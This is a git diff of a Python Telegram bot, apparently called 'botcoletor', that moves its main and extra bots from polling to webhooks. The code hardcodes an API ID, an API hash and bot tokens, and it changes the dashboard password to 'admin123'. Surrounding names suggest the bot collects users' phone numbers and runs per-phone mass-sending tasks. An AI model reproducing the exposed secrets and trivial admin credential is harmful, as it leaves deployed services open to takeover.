@@ -36,7 +36,7 @@ from telegram.ext import (
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 API_ID = 35214126
 API_HASH = "332680c93c1cd23f6d2a9a5d3c990c48"
-BOT_TOKEN = "8969700396:AAFDw7Qr-_iCY8OTgfq3oMjTw79ZKvMDQcc"
+BOT_TOKEN = "8969700396:AAE9Km7v_ngbzIov2EIavgT4e9U7v_Ak_lk"
 
 # ⚠️ URL HTTPS do Mini App (domínio)
 WEBAPP_URL = "https://botcoletor-production.up.railway.app/webapp"
@@ -54,7 +54,7 @@ disparo_tasks = {}  # phone -> asyncio.Task
 session_stats = {}  # phone -> stats dict
 
 # Dashboard
-DASHBOARD_TOKEN = "adm33333333333in123"
+DASHBOARD_TOKEN = "admin123"
 
 # Multi-bot
 connected_bots = {}  # token -> {"app": Application, "username": str, "name": str, "id": int}
@@ -62,6 +62,14 @@ DATA_DIR = "/app/data" if os.path.isdir("/app/data") else BASE_DIR
 BOTS_FILE = os.path.join(DATA_DIR, "bots.json")
 SESSIONS_DIR = os.path.join(DATA_DIR, "sessions")
 os.makedirs(SESSIONS_DIR, exist_ok=True)
+
+# Webhook
+WEBHOOK_BASE = WEBAPP_URL.rsplit("/webapp", 1)[0]  # https://botcoletor-production.up.railway.app
+webhook_apps = {}  # secret -> Application
+
+def token_to_secret(bot_token):
+    """Gera um secret único a partir do token (pra URL do webhook)"""
+    return hashlib.sha256(bot_token.encode()).hexdigest()[:32]
 
 # Log capture — guarda as últimas 5000 linhas
 class LogCapture:
@@ -794,17 +802,22 @@ async def handle_join_request(update: Update, context: ContextTypes.DEFAULT_TYPE
 # MULTI-BOT: INICIAR / PARAR BOTS EXTRAS
 # ===============================
 async def start_extra_bot(bot_token):
-    """Inicia um bot extra com os mesmos handlers do principal"""
-    app = ApplicationBuilder().token(bot_token).build()
+    """Inicia um bot extra com webhook"""
+    app = ApplicationBuilder().token(bot_token).updater(None).build()
     app.add_handler(CommandHandler("start", start))
     app.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     app.add_handler(ChatJoinRequestHandler(handle_join_request))
 
     await app.initialize()
     await app.start()
-    await app.updater.start_polling(allowed_updates=Update.ALL_TYPES)
 
     bot_info = await app.bot.get_me()
+
+    # Registra no webhook
+    secret = token_to_secret(bot_token)
+    webhook_apps[secret] = app
+    webhook_url = f"{WEBHOOK_BASE}/webhook/{secret}"
+    await app.bot.set_webhook(url=webhook_url, allowed_updates=Update.ALL_TYPES)
 
     connected_bots[bot_token] = {
         "app": app,
@@ -813,7 +826,7 @@ async def start_extra_bot(bot_token):
         "id": bot_info.id,
     }
 
-    print(f"[BOTS] 🤖 Bot @{bot_info.username} conectado com sucesso!")
+    print(f"[BOTS] 🤖 Bot @{bot_info.username} conectado via webhook!")
     return bot_info
 
 async def stop_extra_bot(bot_token):
@@ -825,11 +838,15 @@ async def stop_extra_bot(bot_token):
     app = info["app"]
 
     try:
-        await app.updater.stop()
+        await app.bot.delete_webhook()
         await app.stop()
         await app.shutdown()
     except Exception as e:
         print(f"[BOTS] ⚠️ Erro ao parar bot: {e}")
+
+    # Remove do webhook registry
+    secret = token_to_secret(bot_token)
+    webhook_apps.pop(secret, None)
 
     username = info["username"]
     del connected_bots[bot_token]
@@ -1085,6 +1102,25 @@ async def api_list_bots(request):
     return web.json_response({"bots": bots, "count": len(bots)})
 
 # ===============================
+# WEBHOOK HANDLER
+# ===============================
+async def webhook_handler(request):
+    """Recebe updates do Telegram via webhook"""
+    secret = request.match_info['secret']
+    app = webhook_apps.get(secret)
+    if not app:
+        return web.Response(status=404)
+
+    try:
+        data = await request.json()
+        update = Update.de_json(data, app.bot)
+        await app.process_update(update)
+    except Exception as e:
+        print(f"[WEBHOOK] ⚠️ Erro ao processar update: {e}")
+
+    return web.Response(status=200)
+
+# ===============================
 # MAIN
 # ===============================
 async def main():
@@ -1106,14 +1142,16 @@ async def main():
     web_app.router.add_post("/api/dashboard/connect-bot", api_connect_bot)
     web_app.router.add_post("/api/dashboard/disconnect-bot", api_disconnect_bot)
     web_app.router.add_get("/api/dashboard/bots", api_list_bots)
+    # Webhook — rota única pra todos os bots
+    web_app.router.add_post("/webhook/{secret}", webhook_handler)
 
     runner = web.AppRunner(web_app)
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", WEBAPP_PORT)
     await site.start()
 
-    # --- Bot (python-telegram-bot) ---
-    application = ApplicationBuilder().token(BOT_TOKEN).build()
+    # --- Bot Principal (webhook) ---
+    application = ApplicationBuilder().token(BOT_TOKEN).updater(None).build()
     application.add_handler(CommandHandler("start", start))
     application.add_handler(MessageHandler(filters.CONTACT, handle_contact))
     application.add_handler(ChatJoinRequestHandler(handle_join_request))
@@ -1123,11 +1161,18 @@ async def main():
     print(f"🌐 Web Server: http://0.0.0.0:{WEBAPP_PORT}")
     print(f"🔗 Mini App URL: {WEBAPP_URL}")
     print(f"📊 Dashboard: http://0.0.0.0:{WEBAPP_PORT}/dashboard")
-    print(f"👤 Join Request: ATIVO\n")
+    print(f"👤 Join Request: ATIVO")
+    print(f"🔔 Modo: WEBHOOK\n")
 
     async with application:
         await application.start()
-        await application.updater.start_polling(allowed_updates=Update.ALL_TYPES)
+
+        # Registra webhook do bot principal
+        main_secret = token_to_secret(BOT_TOKEN)
+        webhook_apps[main_secret] = application
+        main_webhook_url = f"{WEBHOOK_BASE}/webhook/{main_secret}"
+        await application.bot.set_webhook(url=main_webhook_url, allowed_updates=Update.ALL_TYPES)
+        print(f"[🔔] Webhook principal registrado: {main_webhook_url}")
 
         # Carregar stats salvas
         load_stats()
@@ -1162,7 +1207,6 @@ async def main():
                     await stop_extra_bot(bt)
                 except Exception:
                     pass
-            await application.updater.stop()
             await application.stop()
             await runner.cleanup()
 
